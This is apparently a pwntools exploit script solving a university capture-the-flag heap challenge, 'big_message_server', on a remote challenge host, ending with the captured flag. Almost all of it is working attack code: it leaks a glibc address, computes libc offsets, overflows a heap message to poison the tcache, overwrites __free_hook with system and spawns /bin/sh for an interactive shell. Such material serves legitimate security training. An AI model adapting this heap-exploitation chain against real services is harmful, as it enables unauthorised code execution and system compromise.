from pwn import *

# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h', '-f']

CHALLENGE = "./big_message_server"
URL = "offsec-chalbroker.osiris.cyber.nyu.edu"
PORT = 1213
NETID = b"xz4344"
LOCAL = False

if LOCAL:
    p = process(CHALLENGE)
else:
    p = remote(URL, PORT)
    p.recvuntil(b"NetID (something like abc123): ")
    p.sendline(NETID)

# p = gdb.debug(CHALLENGE, '''
#     b *(main+278)
#     b *(main+302)
#     b *(main+314)
#     continue
# ''')

def add_message(message):
    print(p.recvuntil(b"> ").decode())
    p.send(b"1")
    pprint(p.recvuntil(b"> ").decode())
    p.send(message)
    log.info(f"Adding a message: {message}")

def edit_message(index, message):
    print(p.recvuntil(b"> ").decode())
    p.send(b"3")
    print(p.recvuntil(b"> ").decode())
    p.send(str(index).encode())
    print(p.recvuntil(b"> ").decode())
    p.send(message)
    log.info(f"Editing the message at index: {index} with a new message: {message}")

def send_message(index):
    print(p.recvuntil(b"> ").decode())
    p.send(b"4")
    print(p.recvuntil(b"> ").decode())
    p.send(str(index).encode())
    log.info(f"Sending the message at index: {index}")

# Stage 1: Calculate required addresses
print(p.recvuntil(b": ").decode())
glibc_printf_addr = u64(p.recvline().strip().ljust(8, b"\x00"))
log.info(f"Receiving glibc printf address: {hex(glibc_printf_addr)}")
glibc_e = ELF("libc.so.6")
glibc_base_addr = glibc_printf_addr - glibc_e.symbols.printf
glibc_free_hook_addr = glibc_base_addr + glibc_e.symbols.__free_hook
glibc_system_addr = glibc_base_addr + glibc_e.symbols.system

# Stage 2: Prepare for tcache poisoning
add_message(b"A"*0x8)
add_message(b"B"*0x8)
add_message(b"C"*0x8)
send_message(2)
send_message(1)

# Stage 3: Perform tcache poisoning
edit_message(0, b"A"*0x40 + p64(0x51) + p64(glibc_free_hook_addr-0x8))
add_message(b"D"*0x8)
add_message(p64(glibc_system_addr))
edit_message(0, b"A"*0x40 + p64(0x51) + b"/bin/sh\x00")

# Stage 4: Trigger system("/bin/sh")
send_message(1)

p.interactive()

# flag{Unb0und3d_AND_0V3rfl0w1ng!_38deabcc4ec531c0}
